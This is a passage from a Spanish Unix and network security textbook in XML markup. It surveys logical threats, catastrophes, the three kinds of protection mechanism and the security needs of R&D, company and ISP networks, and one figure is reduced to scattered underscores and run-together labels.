     de ser descubierto: por ejemplo, es t&#x02CA;&#x0131;pico utilizar lo que se denomina un rootkit, que no es
     m&#x00E1;s que un conjunto de versiones troyanas de ciertas utilidades (netstat, ps, who&#x2026;), para
     conseguir que cuando el administrador las ejecute no vea la informaci&#x00F3;n relativa al atacante,
     como sus procesos o su conexi&#x00F3;n al sistema; otro programa que se suele suplantar es login,
     por ejemplo para que al recibir un cierto nombre de usuario y contrase~na proporcione acceso
     al sistema sin necesidad de consultar /etc/passwd.

     </para></listitem>
     <listitem>
     <!--l. 541--><para>Programas conejo o bacterias
     <!--br/-->Bajo este nombre se conoce a los programas que no hacen nada &#x00FA;til, sino que simplemente
     se dedican a reproducirse hasta que el n&#x00FA;mero de copias acaba con los recursos del sistema
     (memoria, procesador, disco&#x2026;), produciendo una negaci&#x00F3;n de servicio. Por s&#x02CA;&#x0131; mismos no hacen
     ning&#x00FA;n da~no, sino que lo que realmente perjudica es el gran n&#x00FA;mero de copias suyas en el sistema,
     que en algunas situaciones pueden llegar a provocar la parada total de la m&#x00E1;quina.
     <!--br/-->Hemos de pensar hay ciertos programas que pueden actuar como conejos sin propon&#x00E9;rselo;
     ejemplos t&#x02CA;&#x0131;picos se suelen encontrar en los sistemas Unix destinados a pr&#x00E1;cticas en las que se
     ense~na a programar al alumnado: es muy com&#x00FA;n que un bucle que por error se convierte en
     in&#xFB01;nito contenga entre sus instrucciones algunas de reserva de memoria, lo que implica que si
     el sistema no presenta una correcta pol&#x02CA;&#x0131;tica de cuotas para procesos de usuario pueda venirse
     abajo o degradar enormemente sus prestaciones. El hecho de que el autor suela ser f&#x00E1;cilmente
     localizable no debe ser ninguna excusa para descuidar esta pol&#x02CA;&#x0131;tica: no podemos culpar a un
     usuario por un simple error, y adem&#x00E1;s el da~no ya se ha producido.
     </para></listitem>
     <listitem>
     <!--l. 559--><para>T&#x00E9;cnicas salami
     <!--br/-->Por  t&#x00E9;cnica  salami  se  conoce  al  robo  automatizado  de  peque~nas  cantidades  de  bienes
     (generalmente dinero) de una gran cantidad origen. El hecho de que la cantidad inicial sea
     grande y la robada peque~na hace extremadamente dif&#x02CA;&#x0131;cil su detecci&#x00F3;n: si de una cuenta con
     varios millones de pesetas se roban unos c&#x00E9;ntimos, nadie va a darse cuenta de ello; si esto se
     automatiza para, por ejemplo, descontar una peseta de cada n&#x00F3;mina pagada en la universidad
     o de cada beca concedida, tras un mes de actividad seguramente se habr&#x00E1; robado una enorme
     cantidad de dinero sin que nadie se haya percatado de este hecho, ya que de cada origen se
     ha tomado una cantidad &#x02CA;&#x0131;n&#xFB01;ma.
     <!--br/-->Las t&#x00E9;cnicas salami no se suelen utilizar para atacar sistemas normales, sino que su uso m&#x00E1;s
     habitual  es  en  sistemas  bancarios;  sin  embargo,  como  en  una  red  con  requerimientos  de
     seguridad medios es posible que haya ordenadores dedicados a contabilidad, facturaci&#x00F3;n de un
     departamento o gesti&#x00F3;n de n&#x00F3;minas del personal, comentamos esta potencial amenaza contra el
     software encargado de estas tareas.</para></listitem></itemizedlist>
<!--l. 576--><para>
  </para></section><!--end subsection--><!--l. 576--><section 
role="subsection"><title><abbrev role="title-mark">1.5.3</abbrev><anchor 
   id="x1-130001.5.3"  ></anchor>Cat&#x00E1;strofes</title>
<!--l. 577--><para>  Las cat&#x00E1;strofes (naturales o arti&#xFB01;ciales) son la amenaza menos probable contra los entornos habituales:
simplemente por su ubicaci&#x00F3;n geogr&#x00E1;&#xFB01;ca, a nadie se le escapa que la probabilidad de sufrir un terremoto o
una inundaci&#x00F3;n que afecte a los sistemas inform&#x00E1;ticos en una gran ciudad como Madrid, Valencia o
Barcelona, es relativamente baja, al menos en comparaci&#x00F3;n con el riesgo de sufrir un intento de acceso por
parte de un pirata o una infecci&#x00F3;n por virus. Sin embargo, el hecho de que las cat&#x00E1;strofres sean amenazas
poco probables no implica que contra ellas no se tomen unas medidas b&#x00E1;sicas, ya que si se produjeran
generar&#x02CA;&#x0131;an los mayores da~nos.
<!--br/-->
<!--br/-->Un subgrupo de las cat&#x00E1;strofes es el denominado de riesgos poco probables. Obviamente se denomina
as&#x02CA;&#x0131; al conjunto de riesgos que, aunque existen, la posibilidad de que se produzcan es tan baja (menor
incluso que la del resto de cat&#x00E1;strofes) que nadie toma, o nadie puede tomar, medidas contra ellos.
Ejemplos habituales de riesgos poco probables son un ataque nuclear contra el sistema, el
impacto de un sat&#x00E9;lite contra la sala de operaciones, o la abducci&#x00F3;n de un operador por una nave
extraterrestre. Nada nos asegura que este tipo de cat&#x00E1;strofes no vaya a ocurrir, pero la probabilidad es
tan baja y los sistemas de prevenci&#x00F3;n tan costosos que no vale la pena tomar medidas contra
ellas.
<!--br/-->
<!--br/-->Como ejemplos de cat&#x00E1;strofes hablaremos de terremotos, inundaciones, incendios, humo o atentados de baja
magnitud (m&#x00E1;s comunes de lo que podamos pensar); obviamente los riesgos poco probables los trataremos
como algo anecd&#x00F3;tico. De cualquier forma, vamos a hablar de estas amenazas sin extendernos

mucho, ya que el objetivo de este proyecto no puede ser el proporcionar las directrices para una
construcci&#x00F3;n de edi&#xFB01;cios a prueba de terremotos, o un plan formal de evacuaci&#x00F3;n en caso de
incendio.
  </para></section><!--end subsection--></section><!--end section--><!--l. 606--><section 
role="section"><title><abbrev role="title-mark">1.6</abbrev><anchor 
   id="x1-140001.6"  ></anchor>&#x00BF;C&#x00F3;mo nos podemos proteger?</title>
<!--l. 607--><para>  Hasta ahora hemos hablado de los aspectos que engloba la seguridad inform&#x00E1;tica, de los elementos a
proteger, de los tipos de amenazas que contra ellos se presentan y del origen de tales amenazas; parece
claro que, para completar nuestra visi&#x00F3;n de la seguridad, hemos de hablar de las formas de
protecci&#x00F3;n de nuestros sistemas. Cuando hayamos completado este punto, habremos presentado a
grandes rasgos los diferentes puntos a tratar en este proyecto, tal y como se sintetiza en la &#xFB01;gura
<ulink 
  url="#x1-140012"  ><!--ref: vision--></ulink>.
<!--br/-->
<!--br/-->Para proteger nuestro sistema hemos de realizar un an&#x00E1;lisis de las amenazas potenciales que
puede sufrir, las p&#x00E9;rdidas que podr&#x02CA;&#x0131;an generar, y la probabilidad de su ocurrencia; a partir de
este an&#x00E1;lisis hemos de dise~nar una pol&#x02CA;&#x0131;tica de seguridad que de&#xFB01;na responsabilidades y reglas
a seguir para evitar tales amenazas o minimizar sus efectos en caso de que se produzcan.
A los mecanismos utilizados para implementar esta pol&#x02CA;&#x0131;tica de seguridad se les denomina
mecanismos de seguridad; son la parte m&#x00E1;s visible de nuestro sistema de seguridad, y se
convierten en la herramienta b&#x00E1;sica para garantizar la protecci&#x00F3;n de los sistemas o de la propia
red.
<!--br/--></para><figure><title/><blockquote>


<!--l. 693--><para>                                          ?
                                            _______________
                                                   __
                                                   ___
                                                                     __
                                                                     ___
    __
    ___
                                    _
                                     __
                                     __________________________________________________________________
                                                                     __
                        ___
  ______________________________________________________ SEGURIDAD
                                     FIABILIDAD
   ASPECTOS                           AMENAZASELEMENTOS
                                   TIPOS         ORIGEN
                                                      Cat&#x00E1;strofesAmenazas l&#x00F3;gicasPersonasMECANISMOS
                                                                        Recuperaci&#x00F3;nDetecci&#x00F3;nPrevenci&#x00F3;nCon&#xFB01;dencialidad
       Integridad
       Disponibilidad                   Interrupci&#x00F3;n
                                      Interceptaci&#x00F3;n
                                      Modi&#xFB01;caci&#x00F3;n
                                      Fabricaci&#x00F3;nHardware
                          Software
                          Datos
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-140012"  ></anchor>Figura&#x00A0;1.2</title><para>Visi&#x00F3;n global de la seguridad inform&#x00E1;tica</para></blockquote>

  </para></blockquote></figure>
<!--br/-->Los mecanismos de seguridad se dividen en tres grandes grupos: de prevenci&#x00F3;n, de detecci&#x00F3;n y de
recuperaci&#x00F3;n. Los mecanismos de prevenci&#x00F3;n son aquellos que aumentan la seguridad de un
sistema durante el funcionamiento normal de &#x00E9;ste, previniendo la ocurrencia de violaciones a la
seguridad; por ejemplo, el uso de cifrado en la transmisi&#x00F3;n de datos se puede considerar un
mecanismo de este tipo, ya que evita que un posible atacante escuche las conexiones hacia o
desde un sistema Unix en la red. Por mecanismos de detecci&#x00F3;n se conoce a aquellos que se
utilizan para detectar violaciones de la seguridad o intentos de violaci&#x00F3;n; ejemplos de estos
mecanismos son los programas de auditor&#x02CA;&#x0131;a como Tripwire. Finalmente, los mecanismos de
recuperaci&#x00F3;n son aquellos que se aplican cuando una violaci&#x00F3;n del sistema se ha detectado, para
retornar a &#x00E9;ste a su funcionamiento correcto; ejemplos de estos mecanismos son la utilizaci&#x00F3;n de
copias de seguridad o el hardware adicional. Dentro de este &#x00FA;ltimo grupo de mecanismos de
seguridad encontramos un subgrupo denominado mecanismos de an&#x00E1;lisis forense, cuyo
objetivo no es simplemente retornar al sistema a su modo de trabajo normal, sino averiguar el
alcance de la violaci&#x00F3;n, las actividades de un intruso en el sistema, y la puerta utilizada para
entrar <anchor 
   id="x1-14002f6"  ></anchor><footnote><para>     Si adem&#x00E1;s los resultados se pretenden utilizar como pruebas ante un tribunal, se habla de Informatoscopia
(<citation>[?]</citation>).</para></footnote>;
de esta forma se previenen ataques posteriores y se detectan ataques a otros sistemas de nuestra
red.
<!--br/-->
<!--br/-->Parece claro que, aunque los tres tipos de mecanismos son importantes para la seguridad de nuestro
sistema, hemos de enfatizar en el uso de mecanismos de prevenci&#x00F3;n y de detecci&#x00F3;n; la m&#x00E1;xima popular &#x2018;m&#x00E1;s
vale prevenir que curar&#x2019; se puede aplicar a la seguridad inform&#x00E1;tica: para nosotros, evitar un ataque,
detectar un intento de violaci&#x00F3;n, o detectar una violaci&#x00F3;n exitosa inmediatamente despu&#x00E9;s de que ocurra es
mucho m&#x00E1;s productivo y menos comprometedor para el sistema que restaurar el estado tras una penetraci&#x00F3;n
de la m&#x00E1;quina. Es m&#x00E1;s, si consigui&#x00E9;ramos un sistema sin vulnerabilidades y cuya pol&#x02CA;&#x0131;tica de seguridad se
implementara mediante mecanismos de prevenci&#x00F3;n de una forma completa, no necesitar&#x02CA;&#x0131;amos mecanismos
de detecci&#x00F3;n o recuperaci&#x00F3;n. Aunque esto es imposible de conseguir en la pr&#x00E1;ctica, ser&#x00E1; en los
mecanismos de detecci&#x00F3;n, y sobre todo en los de prevenci&#x00F3;n, en los que centraremos nuestro
trabajo.
<!--br/-->
<!--br/-->Los mecanismos de prevenci&#x00F3;n m&#x00E1;s habituales en Unix y en redes son los siguientes (<citation>[?]</citation>):
     <itemizedlist>
     <listitem>
     <!--l. 735--><para>Mecanismos de autenticaci&#x00F3;n e identi&#xFB01;caci&#x00F3;n
     <!--br/-->Estos  mecanismos  hacen  posible  identi&#xFB01;car  entidades  del  sistema  de  una  forma  &#x00FA;nica,  y
     posteriormente, una vez identi&#xFB01;cadas, autenticarlas (comprobar que la entidad es qui&#x00E9;n dice
     ser). Son los mecanismos m&#x00E1;s importantes en cualquier sistema, ya que forman la base de otros
     mecanismos que basan su funcionamiento en la identidad de las entidades que acceden a un
     objeto.
     <!--br/-->Un grupo especialmente importante de estos mecanismos son los denominados Sistemas de
     Autenticaci&#x00F3;n de Usuarios, a los que prestaremos una especial atenci&#x00F3;n por ser los m&#x00E1;s utilizados
     en la pr&#x00E1;ctica.
     </para></listitem>
     <listitem>
     <!--l. 744--><para>Mecanismos de control de acceso
     <!--br/-->Cualquier  objeto  del  sistema  ha  de  estar  protegido  mediante  mecanismos  de  control  de
     acceso, que controlan todos los tipos de acceso sobre el objeto por parte de cualquier entidad
     del sistema. Dentro de Unix, el control de acceso m&#x00E1;s habitual es el discrecional (DAC,
     Discretionary Access Control), implementado por los bits rwx y las listas de control de acceso
     para cada &#xFB01;chero (objeto) del sistema; sin embargo, tambi&#x00E9;n se permiten especi&#xFB01;car controles
     de acceso obligatorio (MAC).
     </para></listitem>
     <listitem>
     <!--l. 753--><para>Mecanismos de separaci&#x00F3;n

     <!--br/-->Cualquier sistema con diferentes niveles de seguridad ha de implementar mecanismos que
     permitan separar los objetos dentro de cada nivel, evitando el &#xFB02;ujo de informaci&#x00F3;n entre objetos
     y entidades de diferentes niveles siempre que no exista una autorizaci&#x00F3;n expresa del mecanismo
     de control de acceso.
     <!--br/-->Los mecanismos de separaci&#x00F3;n se dividen en cinco grandes grupos, en funci&#x00F3;n de como separan
     a los objetos: separaci&#x00F3;n f&#x02CA;&#x0131;sica, temporal, l&#x00F3;gica, criptogr&#x00E1;&#xFB01;ca y fragmentaci&#x00F3;n. Dentro de Unix,
     el mecanismo de separaci&#x00F3;n m&#x00E1;s habitual es el de separaci&#x00F3;n l&#x00F3;gica o aislamiento, implementado
     en algunos sistemas mediante una Base Segura de C&#x00F3;mputo (TCB).
     </para></listitem>
     <listitem>
     <!--l. 763--><para>Mecanismos de seguridad en las comunicaciones
     <!--br/-->Es especialmente importante para la seguridad de nuestro sistema el proteger la integridad y la
     privacidad de los datos cuando se transmiten a trav&#x00E9;s de la red. Para garantizar esta seguridad
     en las comunicaciones, hemos de utilizar ciertos mecanismos, la mayor&#x02CA;&#x0131;a de los cuales se basan
     en la Criptograf&#x02CA;&#x0131;a: cifrado de clave p&#x00FA;blica, de clave privada, &#xFB01;rmas digitales&#x2026;Aunque cada
     vez se utilizan m&#x00E1;s los protocolos seguros (como SSH o Kerberos, en el caso de sistemas Unix
     en red), a&#x00FA;n es frecuente encontrar conexiones en texto claro ya no s&#x00F3;lo entre m&#x00E1;quinas de una
     misma subred, sino entre redes diferentes. Una de las mayores amenazas a la integridad de las
     redes es este tr&#x00E1;&#xFB01;co sin cifrar, que hace extremadamente f&#x00E1;ciles ataques encaminados a robar
     contrase~nas o suplantar la identidad de m&#x00E1;quinas de la red.</para></listitem></itemizedlist>
<!--l. 777--><para>A lo largo de este trabajo intentaremos explicar el funcionamiento de algunos de estos mecanismos para
conseguir sistemas Unix m&#x00E1;s &#xFB01;ables; pero mucho m&#x00E1;s importante que el funcionamiento de, por ejemplo, la
Base Segura de C&#x00F3;mputo o las Listas de Control de Acceso, es la concienciaci&#x00F3;n de usuarios y
administradores de las ventajas en materias de seguridad que estos mecanismos, y muchos otros, ofrecen.
Hemos de recordar que un sistema Unix instalado tal y como se distribuye suele representar una puerta
abierta para cualquier pirata sin unos grandes conocimientos; si ese mismo sistema lo con&#xFB01;guramos
m&#x02CA;&#x0131;nimamente antes de ponerlo a trabajar, un intruso necesitar&#x00E1; unos conocimientos del sistema
operativo y de la red m&#x00E1;s o menos amplios (o mucha suerte) si quiere violar su seguridad. Como ya
dijimos, el objetivo de este proyecto no es conseguir unos sistemas con seguridad militar en
un entorno de normal (algo imposible), sino conseguir un entorno de trabajo m&#x02CA;&#x0131;nimamente
&#xFB01;able.
  </para></section><!--end section--><!--l. 791--><section 
role="section"><title><abbrev role="title-mark">1.7</abbrev><anchor 
   id="x1-150001.7"  ></anchor>Redes &#x2018;normales&#x2019;</title>
<!--l. 792--><para>  En este trabajo, como ya hemos comentado, no se pretende ni mucho menos adentrarse en
temas de seguridad que se podr&#x02CA;&#x0131;a considerar &#x2018;de alto nivel&#x2019;, como la necesaria en un entorno
militar <anchor 
   id="x1-15001f7"  ></anchor><footnote><para>     Tampoco creo que fuera posible; a &#xFB01;n de cuentas, la seguridad de estos sistemas s&#x00F3;lo la conocen los militares&#x2026;</para></footnote>,
de inteligencia, o en una gran empresa que maneje datos muy apetecibles para sus competidores. Un fallo
en la seguridad de los sistemas inform&#x00E1;ticos de una central nuclear puede ser catastr&#x00F3;&#xFB01;co &#x2013; en el m&#x00E1;s amplio
sentido de la palabra &#x2013;; un peque~no fallo en los sistemas encargados de lanzar un sat&#x00E9;lite nos costar&#x02CA;&#x0131;a a
todos miles de millones de d&#x00F3;lares&#x2026;si en lugar de ser un sat&#x00E9;lite es un misil, podemos imaginarnos las
consecuencias. Por fortuna para todos nosotros, esos sistemas son altamente seguros y por
supuesto no son simples ordenadores conectados a Internet&#x2026;ni siquiera a redes de prop&#x00F3;sito
general.
<!--br/-->
<!--br/-->Pero lo m&#x00E1;s probable es que todas estas cosas nos queden demasiado lejos a la mayor&#x02CA;&#x0131;a de mortales; para
nosotros los problemas de seguridad diarios son intrusiones, virus (sin comentarios), negaciones de servicio
contra una m&#x00E1;quina que sirve p&#x00E1;ginas web&#x2026;algo mucho m&#x00E1;s terrenal que todo lo anterior. Es en este tipo de
entornos donde los mecanismos que estudiaremos se pueden aplicar m&#x00E1;s f&#x00E1;cilmente, tanto por las
caracter&#x02CA;&#x0131;sticas de los sistemas utilizados como por el &#x2013; relativamente &#x2013; bajo peligro de nuestros atacantes:
imagino que la CIA o el KGB no estar&#x00E1;n dispuestos a pagar a piratas profesionales para que
entren y lean nuestro correo; los intrusos potencialmente interesados en nuestras m&#x00E1;quinas ser&#x00E1;n
chavales que s&#x00F3;lo buscan un cierto status social en un grupo de a&#xFB01;cionados a la pirater&#x02CA;&#x0131;a, o que
acaban de ver una pel&#x02CA;&#x0131;cula &#x2013; de cuyo nombre no quiero acordarme &#x2013; y tratan de emular a los
actores. Gente que ante la m&#x00E1;s m&#x02CA;&#x0131;nima di&#xFB01;cultad para acceder a nuestra red, la abandonar&#x00E1; y se

dedicar&#x00E1; a objetivos m&#x00E1;s f&#x00E1;ciles (como la red de nuestro vecino). Contra este tipo de personas es
contra quien debemos esforzarnos: ya hemos dicho que es in&#x00FA;til intentar parar a un atacante
profesional, pagado, o muy interesado en nuestras m&#x00E1;quinas; el que su ataque tenga &#x00E9;xito es s&#x00F3;lo
cuesti&#x00F3;n de tiempo, y seguramente depende m&#x00E1;s de la suerte que tenga &#x00E9;l frente a la que tengamos
nosotros. Pero estos atacantes son minor&#x02CA;&#x0131;a, y lo que debemos buscar es defendernos contra la
mayor&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->Ejemplos de redes &#x2018;normales&#x2019;, de entornos con unos requerimientos de seguridad medios (pero
requerimientos, al &#xFB01;n y al cabo), son las redes de I+D (universidades, centros de investigaci&#x00F3;n&#x2026;), las de
empresas medianas y las de proveedores de acceso a Internet; vamos a hablar en este punto de las
caracter&#x02CA;&#x0131;sticas de cada una de ellas.
  </para><!--l. 831--><section 
role="subsection"><title><abbrev role="title-mark">1.7.1</abbrev><anchor 
   id="x1-160001.7.1"  ></anchor>Redes de I+D</title>
<!--l. 832--><para>  En cualquier tipo de red, basada en Unix o no, la seguridad es siempre un factor a tener en cuenta a la
hora de administrar la propia red y sus m&#x00E1;quinas. Por supuesto las redes de I+D no son ninguna excepci&#x00F3;n,
y aunque con demasiada frecuencia su seguridad es m&#x02CA;&#x0131;nima &#x2013; o ni siquiera existe &#x2013; merece la pena invertir
tiempo, y por qu&#x00E9; no, dinero, para garantizar un m&#x02CA;&#x0131;nimo nivel de seguridad que proporcione un entorno de
trabajo aceptable.
<!--br/-->
<!--br/-->Las redes de I+D tienen unas caracter&#x02CA;&#x0131;sticas propias que no poseen otras redes, por ejemplo las militares o
las pertenecientes a empresas. El rasgo diferenciador de redes I+D m&#x00E1;s importante es su car&#x00E1;cter
extremadamente abierto: mientras que una empresa puede limitar el acceso exterior a trav&#x00E9;s de un simple
&#xFB01;rewall, u ofrecer s&#x00F3;lo determinados servicios al exterior de la empresa, como unas p&#x00E1;ginas web, una red de
I+D no puede permitirse este car&#x00E1;cter tan cerrado. Esto es debido a que el aspecto de la seguridad m&#x00E1;s
importante en las redes de investigaci&#x00F3;n es la disponibilidad: a todo el personal investigador le interesa que
sus publicaciones sean lo m&#x00E1;s accesibles a trav&#x00E9;s de la web, al alumnado le interesa poder consultar sus datos
acad&#x00E9;micos desde casa, por Internet, etc. Y es muy dif&#x02CA;&#x0131;cil hacerles cambiar de opini&#x00F3;n, o al menos
concienciarlos de los problemas de seguridad que una excesiva apertura supone: si un profesor
acude a una conferencia en cualquier lugar del mundo no se le puede obligar, por ejemplo, a
kerberizar todas las aplicaciones de su ordenador port&#x00E1;til simplemente para poder leer el correo a
distancia; simplemente desea ejecutar un telnet, igual que si estuviera en el campus, para
hacerlo.
<!--br/-->
<!--br/-->La caracter&#x02CA;&#x0131;stica que acabamos de comentar es algo muy negativo de cara a mantener la seguridad de los
sistemas; no podemos limitarnos a establecer una f&#x00E9;rrea pol&#x02CA;&#x0131;tica de &#xFB01;ltrado de paquetes o a restringir
servicios, ya que los usuarios no van a aceptarlo. Sin embargo, no todas las caracter&#x02CA;&#x0131;sticas de las redes de
I+D son un problema para su seguridad; por ejemplo, un importante punto a favor es el escaso inter&#x00E9;s para
un pirata de los datos con los que se trabaja generalmente en institutos de investigaci&#x00F3;n o centros
universitarios. En entornos de estas caracter&#x02CA;&#x0131;sticas no se suele trabajar con datos que impliquen informaci&#x00F3;n
valiosa para un esp&#x02CA;&#x0131;a industrial o militar, ni tampoco se mueven grandes cantidades de dinero a trav&#x00E9;s del
comercio electr&#x00F3;nico; casi todo lo que un intruso va a encontrar en una m&#x00E1;quina de I+D son
programas, documentos, resultados de simulaciones&#x2026;que a muy poca gente, aparte de sus autores,
interesan.
<!--br/-->
<!--br/-->Entonces, &#x00BF;contra qui&#x00E9;n nos enfrentamos? Muy pocos de los intrusos que podamos encontrar en redes de
I+D son piratas expertos; la mayor&#x02CA;&#x0131;a son gente poco experimentada, que incluso ataca nuestras
m&#x00E1;quinas desde sus PCs en casa corriendo MS-DOS (desde 6.2 hasta 2000) sin saber nada sobre
Unix o redes. La mejor defensa contra estos individuos consiste simplemente en cerrar los
servicios que no sean estrictamente necesarios y mantener actualizado el software de nuestras
m&#x00E1;quinas que se pueda considerar cr&#x02CA;&#x0131;tico (n&#x00FA;cleo, demonios, &#xFB01;cheros setuidados&#x2026;). Casi todos ellos
suelen actuar movidos &#x00FA;nicamente por el af&#x00E1;n de conseguir un cierto status en comunidades
virtuales de piratas; ni siquiera act&#x00FA;an por curiosidad o para ampliar sus conocimientos, con lo
que tenemos una importante ventaja contra ellos: es muy raro &#x2013; pero no imposible &#x2013; que se
obsesionen por nuestra red o sus m&#x00E1;quinas, de forma que si conseguimos que sus primeros
intentos por acceder no sean fruct&#x02CA;&#x0131;feros directamente dejar&#x00E1;n el ataque para dedicarse a objetivos

m&#x00E1;s f&#x00E1;ciles. En cuanto a los piratas con un mayor nivel de conocimientos, si los encontramos
en una red de I+D seguramente ser&#x00E1; porque utilizan nuestros equipos como plataforma para
atacar servidores &#x2018;m&#x00E1;s interesantes&#x2019; para un intruso, como m&#x00E1;quinas militares o de centros de
investigaci&#x00F3;n muy importantes, como la NASA; en estos casos es obligatorio poner sobre aviso al
organismo de mayor nivel responsable de la seguridad en la red: este organismo es, en el caso
de la red universitaria espa~nola, IrisCERT, cuya informaci&#x00F3;n de contacto se cita al &#xFB01;nal del
proyecto junto a la de otros organismos relacionados con la seguridad inform&#x00E1;tica a distintos
niveles.
  </para></section><!--end subsection--><!--l. 892--><section 
role="subsection"><title><abbrev role="title-mark">1.7.2</abbrev><anchor 
   id="x1-170001.7.2"  ></anchor>Empresas</title>
<!--l. 893--><para>  Las redes y sistemas pertenecientes a empresas son, a priori, las que mayores ventajas presentan en
lo relativo a su protecci&#x00F3;n; en primer lugar, se trata de redes que suelen ser muy aislables:
muchas empresas disponen de una LAN en el edi&#xFB01;cio donde est&#x00E1;n ubicadas, red que se puede
aislar perfectamente del exterior mediante cortafuegos. Incluso si se han de ofrecer servicios
hacia el exterior (t&#x02CA;&#x0131;picamente, correo electr&#x00F3;nico y web), se pueden situar los servidores en una
zona desmilitarizada entre el router y la red interna. Adem&#x00E1;s, en muchos casos la LAN de la
empresa ni siquiera es realmente necesario que est&#x00E9; conectada a Internet, aunque esto cada d&#x02CA;&#x0131;a es
menos habitual m&#x00E1;s por requisitos humanos que t&#x00E9;cnicos: aunque no haga falta para el trabajo la
conexi&#x00F3;n a Internet, el clima de descontento entre nuestro personal que puede suponer bloquear el
acceso hacia el exterior es una gran traba de cara al aislamiento &#x2013; y por tanto, a la seguridad
&#x2013;.
<!--br/-->
<!--br/-->Esta es la teor&#x02CA;&#x0131;a; como siempre, casi perfecta: vamos a a~nadirle problemas reales para comprobar que las
cosas no son tan bonitas como las acabamos de pintar. En primer lugar: imaginemos una empresa con
varias sucursales &#x2013; o&#xFB01;cinas, almacenes&#x2026;&#x2013; separadas geogr&#x00E1;&#xFB01;camente. Si la distancia entre todas ellas es
corta y la empresa solvente, quiz&#x00E1;s se puedan permitir una red propia, dedicada, y protegida por
los t&#x00E9;cnicos de la propia compa~n&#x02CA;&#x0131;a; pero esto rara vez es as&#x02CA;&#x0131;: conforme aumenta la separaci&#x00F3;n,
la idea de la red dedicada se va difuminando (simplemente con una distancia de un par de
kil&#x00F3;metros &#x2013; o menos, dependiendo de la zona &#x2013; ya resulta imposible esta aproximaci&#x00F3;n). Ahora
entra en juego una red de prop&#x00F3;sito general como base de comunicaciones, seguramente la red
telef&#x00F3;nica, o incluso Internet; la protecci&#x00F3;n de la red ya no depende exclusivamente de nuestra
organizaci&#x00F3;n, sino que entran en juego terceras compa~n&#x02CA;&#x0131;as &#x2013; posiblemente Telef&#x00F3;nica, con todo lo
que ello implica&#x2026;&#x2013;. Es casi indispensable recurrir a redes privadas virtuales (Virtual Private
Networks, VPN), canales de comunicaci&#x00F3;n seguros dentro de esa red insegura. Al menos podemos
mantener comunicaciones seguras entre las diferentes sucursales&#x2026;pero no todas las compa~n&#x02CA;&#x0131;as
recurren a estos mecanismos: realmente, es m&#x00E1;s f&#x00E1;cil utilizar la red de prop&#x00F3;sito general como si
fuera segura, enviando por ella toda la informaci&#x00F3;n que queramos intercambiar entre o&#xFB01;cinas,
sin proteger. Adem&#x00E1;s, la seguridad no suele ser tangible: seguramente nuestro jefe estar&#x00E1; m&#x00E1;s
contento si en un d&#x02CA;&#x0131;a tiene montada la red aunque sea insegura, sin esperar a la con&#xFB01;guraci&#x00F3;n de
la red privada &#x2013; evidentemente, m&#x00E1;s costosa &#x2013;, aunque a la larga resulte una soluci&#x00F3;n mucho
peor.
<!--br/-->
<!--br/-->Compliquemos a&#x00FA;n m&#x00E1;s la seguridad de nuestra compa~n&#x02CA;&#x0131;a: ahora entran en juego estaciones m&#x00F3;viles, por
ejemplo comerciales con port&#x00E1;tiles que deben comunicarse con los equipos &#xFB01;jos, o ejecutivos que al salir de
viaje de negocios quieren poder seguir leyendo su correo. Estas estaciones est&#x00E1;n dando muchos quebraderos
de cabeza, tanto a nivel de conectividad como de seguridad&#x2026;otro potencial problema para nuestra
empresa; realmente, no tan potencial: seguramente esa persona que est&#x00E1; de viaje acabar&#x00E1; conectado su
portatil a la l&#x02CA;&#x0131;nea telef&#x00F3;nica de un hotel, y conectando con las m&#x00E1;quinas &#xFB01;jas v&#x02CA;&#x0131;a m&#x00F3;dem. Por supuesto, esa
persona ni ha o&#x02CA;&#x0131;do ni quiere oir hablar de conexiones cifradas: es m&#x00E1;s f&#x00E1;cil un telnet o un rlogin contra el
servidor para poder leer el correo; a &#xFB01;n de cuentas, los piratas son algo que s&#x00F3;lo existe en las
pel&#x02CA;&#x0131;culas&#x2026;
<!--br/-->
<!--br/-->Hasta ahora todos los ataques contra la empresa eran &#x2013; en principio &#x2013; externos; pero imaginemos que uno
de nuestros empleados no est&#x00E1; contento con su sueldo y decide irse a la competencia. Y no s&#x00F3;lo quiere irse,
sino que decide llevarse varios documentos con&#xFB01;denciales, documentos a los que ha tenido un f&#x00E1;cil acceso

simplemente acerc&#x00E1;ndose a una de las impresoras comunes, recogiendo los listados, y fotocopi&#x00E1;ndolos antes
de entregarlos a su due~no. O incluso m&#x00E1;s f&#x00E1;cil: en nuestra empresa los ordenadores de los empleados utilizan
Windows 9x, y todos los puestos ofrecen los discos duros como recursos compartidos; a &#xFB01;n de cuentas,
as&#x02CA;&#x0131; es mucho m&#x00E1;s f&#x00E1;cil el intercambio de informaci&#x00F3;n entre empleados. Esa persona, sin ni siquiera levantarse
de su puesto de trabajo, tiene acceso a casi toda la informaci&#x00F3;n de nuestra empresa&#x2026;Por cierto,
esto no pretende ser un ataque a la seguridad de estos productos (aunque f&#x00E1;cilmente podr&#x02CA;&#x0131;a
serlo), sino una realidad que se puede ver en much&#x02CA;&#x0131;simas empresas, sobre todo peque~nas y
medianas.
<!--br/-->
<!--br/-->Como acabamos de ver, ha sido su&#xFB01;ciente con plantear un par de situaciones &#x2013; de lo m&#x00E1;s normales &#x2013; para
romper toda la idea de seguridad f&#x00E1;cil que ten&#x02CA;&#x0131;amos al principio; y eso sin plantear problemas m&#x00E1;s
rebuscados: &#x00BF;qu&#x00E9; sucede si a una empresa de la competencia le da por sabotear nuestra imagen atacando
nuestras p&#x00E1;ginas web? &#x00BF;y si le interesa leer nuestros e&#x2013;mails? No hace falta que se trate de una
multinacional poderosa dispuesta a contratar piratas profesionales: es su&#xFB01;ciente con que el administrador
de la red de nuestra competencia tenga unas nociones sobre seguridad&#x2026;y bastantes ganas de
fastidiarnos.
  </para></section><!--end subsection--><!--l. 968--><section 
role="subsection"><title><abbrev role="title-mark">1.7.3</abbrev><anchor 
   id="x1-180001.7.3"  ></anchor>ISPs</title>
<!--l. 969--><para>  Las empresas dedicadas a ofrecer acceso a Internet a trav&#x00E9;s de la l&#x02CA;&#x0131;nea telef&#x00F3;nica, as&#x02CA;&#x0131; como otros servicios
de red (principalmente, hospedaje de p&#x00E1;ginas web) son los conocidos ISPs (Internet Service Providers);
conocidos tanto por sus servicios como por su inseguridad. Y es que realmente no es f&#x00E1;cil compaginar una
amplia oferta de servicios con una buena seguridad: cualquier administrador de m&#x00E1;quinas Unix sabe que
cada puerto abierto en su sistema es una potencial fuente de problemas para el mismo, por lo que conviene
